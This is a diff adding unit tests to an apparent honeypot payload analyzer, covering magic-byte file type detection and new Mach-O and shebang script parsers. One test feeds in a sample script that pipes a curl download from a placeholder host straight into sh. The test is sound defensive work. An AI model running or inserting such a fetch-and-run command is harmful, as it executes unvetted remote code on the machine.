@@ -2,9 +2,11 @@
 
 from honeyknot.analyzer import (
     analyze_elf,
+    analyze_macho,
     analyze_payload,
     analyze_pdf,
     analyze_pe,
+    analyze_shebang,
     identify_file_type,
     scan_payload,
 )
@@ -40,6 +42,34 @@ class TestIdentifyFileType:
 
     def test_rar(self):
         assert identify_file_type(b"Rar!\x1a\x07" + b"\x00" * 58) == "RAR"
+
+    def test_7z(self):
+        assert identify_file_type(b"7z\xbc\xaf\x27\x1c" + b"\x00" * 58) == "7Z"
+
+    def test_xz(self):
+        assert identify_file_type(b"\xfd7zXZ\x00" + b"\x00" * 58) == "XZ"
+
+    def test_bzip2(self):
+        assert identify_file_type(b"BZh9" + b"\x00" * 60) == "BZIP2"
+
+    def test_cab(self):
+        assert identify_file_type(b"MSCF" + b"\x00" * 60) == "CAB"
+
+    def test_dex(self):
+        assert identify_file_type(b"dex\n035\x00" + b"\x00" * 56) == "DEX (Android)"
+
+    def test_wasm(self):
+        assert identify_file_type(b"\x00asm\x01\x00\x00\x00") == "WASM"
+
+    def test_lnk(self):
+        magic = b"\x4c\x00\x00\x00\x01\x14\x02\x00"
+        assert identify_file_type(magic + b"\x00" * 56) == "LNK (Windows shortcut)"
+
+    def test_shebang(self):
+        assert identify_file_type(b"#!/bin/sh\necho hi\n") == "script (shebang)"
+
+    def test_macho_thin(self):
+        assert identify_file_type(b"\xcf\xfa\xed\xfe" + b"\x00" * 60) == "Mach-O"
 
     def test_unknown(self):
         assert identify_file_type(b"hello world blah blah") is None
@@ -130,6 +160,49 @@ class TestAnalyzePayload:
         result = analyze_payload(b"\x1f\x8b\x08\x00" + b"\x00" * 60)
         assert result is not None
         assert result["type"] == "GZIP"
+
+
+class TestAnalyzeMacho:
+    def test_thin_arm64_little_endian(self):
+        # magic cf fa ed fe (64-bit LE), cpu_type = 0x0100000C (arm64)
+        header = b"\xcf\xfa\xed\xfe" + b"\x0c\x00\x00\x01" + b"\x00" * 20
+        result = analyze_macho(header)
+        assert result["type"] == "Mach-O"
+        assert result["endian"] == "little"
+        assert result["arch"] == "arm64"
+
+    def test_thin_x86_big_endian(self):
+        # magic fe ed fa ce (32-bit BE), cpu_type = 0x00000007 (x86)
+        header = b"\xfe\xed\xfa\xce" + b"\x00\x00\x00\x07" + b"\x00" * 20
+        result = analyze_macho(header)
+        assert result["endian"] == "big"
+        assert result["arch"] == "x86"
+
+    def test_universal_fat(self):
+        # cafebabe with a small nfat_arch is a Mach-O fat binary
+        header = b"\xca\xfe\xba\xbe" + b"\x00\x00\x00\x02" + b"\x00" * 20
+        result = analyze_macho(header)
+        assert result["type"] == "Mach-O (universal)"
+        assert result["archs"] == 2
+
+    def test_java_class_disambiguated(self):
+        # cafebabe with major_version >= 45 is a Java .class, not Mach-O
+        header = b"\xca\xfe\xba\xbe" + b"\x00\x00\x00\x34" + b"\x00" * 20
+        result = analyze_macho(header)
+        assert result["type"] == "Java class"
+        assert result["major_version"] == 52
+
+
+class TestAnalyzeShebang:
+    def test_interpreter_extracted(self):
+        result = analyze_shebang(b"#!/usr/bin/python3 -c\nimport os\n")
+        assert result["type"] == "script (shebang)"
+        assert result["interpreter"] == "/usr/bin/python3 -c"
+
+    def test_via_analyze_payload(self):
+        result = analyze_payload(b"#!/bin/bash\ncurl http://x/y | sh\n")
+        assert result is not None
+        assert result["interpreter"] == "/bin/bash"
 
 
 class TestScanPayload:
